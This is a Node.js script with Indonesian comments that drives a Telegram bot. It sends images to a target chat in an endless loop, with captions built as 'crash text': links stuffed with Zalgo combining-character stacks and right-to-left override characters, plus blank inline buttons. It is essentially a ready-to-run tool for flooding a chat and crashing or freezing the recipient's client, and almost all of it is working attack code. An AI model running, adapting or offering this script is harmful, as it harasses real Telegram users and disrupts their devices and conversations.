require('dotenv').config(); // Memuat variabel dari .env
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

// Konfigurasi token bot dan chat ID dari .env
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const bot = new TelegramBot(BOT_TOKEN, { polling: false });

// Path folder gambar
const folderPath = './images';

// Fungsi untuk membuat teks Zalgo
const zalgo = (text) => {
  const zalgoUp = ['̍', '̎', '̄', '̅', '̿', '̑', '̆', '̐', '͒', '͗', '͑', '̇', '̈', '̊', '͂', '̓', '̈', '͊', '͋', '͌', '̃', '̂', '̌', '͐', '̀', '́', '̋', '̏', '̒', '̓', '̔', '̽', '̉', 'ͣ', 'ͤ', 'ͥ', 'ͦ', 'ͧ', 'ͨ', 'ͩ', 'ͪ', 'ͫ', 'ͬ', 'ͭ', 'ͮ', 'ͯ', '̾', '͛', '͆', '̚'];
  const zalgoDown = ['̖', '̗', '̘', '̙', '̜', '̝', '̞', '̟', '̠', '̤', '̥', '̦', '̩', '̪', '̫', '̬', '̭', '̮', '̯', '̰', '̱', '̲', '̳', '̹', '̺', '̻', '̼', 'ͅ', '͇', '͈', '͉', '͍', '͎', '͓', '͔', '͕', '͖', '͙', '͚', '̣'];
  const zalgoMid = ['̕', '̛', '̀', '́', '͘', '̡', '̢', '̧', '̨', '̴', '̵', '̶', '͜', '͝', '͞', '͟', '͠', '͢', '̸', '̷', '͡', '҉'];

  const randomChar = (arr) => arr[Math.floor(Math.random() * arr.length)];
  let zalgoText = '';

  for (let char of text) {
    zalgoText += char;

    for (let i = 0; i < 15; i++) {
      zalgoText += randomChar(zalgoUp);
      zalgoText += randomChar(zalgoMid);
      zalgoText += randomChar(zalgoDown);
    }
  }

  return zalgoText;
};

// Teks Zalgo dengan efek seperti link
const crashText = `[${zalgo('            ‮‮‮🤡   ')}](${zalgo('https://               .com')})`;

// Inline Keyboard (Button)
const inlineKeyboard = {
  reply_markup: {
    inline_keyboard: [
      [{ text: '               ', callback_data: 'https://               .com' }],
      [{ text: '               ', callback_data: '               ' }],
    ],
  },
};

let successCount = 0;
let failureCount = 0;

// Fungsi untuk memilih file secara acak
const getRandomFile = (files) => {
  return files[Math.floor(Math.random() * files.length)];
};

// Fungsi utama untuk mengirim gambar dengan teks crash
const sendImagesWithCrashText = async () => {
  try {
    const files = fs.readdirSync(folderPath).filter((file) =>
      /\.(jpg|jpeg|png|gif)$/i.test(file)
    );

    if (files.length === 0) {
      console.log('⚠️ Tidak ada file gambar di folder. Menunggu file baru...');
      return;
    }

    const fileName = getRandomFile(files);
    const filePath = path.join(folderPath, fileName);

    try {
      console.log(`\x1b[36m🚀 Mengirim: ${fileName}\x1b[0m`);
      await bot.sendPhoto(CHAT_ID, filePath, {
        caption: crashText,
        parse_mode: 'MarkdownV2',
        ...inlineKeyboard,
      });
      successCount++;
      console.log(`\x1b[32m✅ Status: Berhasil\x1b[0m`);
    } catch (error) {
      failureCount++;
      console.error(`\x1b[31m❌ Status: Gagal - ${error.message}\x1b[0m`);
    }

    const delay = Math.floor(Math.random() * (20 - 50 + 1) + 50);
    await new Promise((resolve) => setTimeout(resolve, delay));
  } catch (error) {
    console.error('❗ Terjadi kesalahan:', error);
  }
};

const mainLoop = async () => {
  console.clear();
  console.log('🔥 Bot aktif. Tekan Ctrl + C untuk berhenti.');
  console.log('==========================================');
  console.log(`\x1b[33m📊 Total berhasil: ${successCount}\x1b[0m`);
  console.log(`\x1b[31m📊 Total gagal: ${failureCount}\x1b[0m`);
  console.log('==========================================\n');

  while (true) {
    await sendImagesWithCrashText();
  }
};

mainLoop();
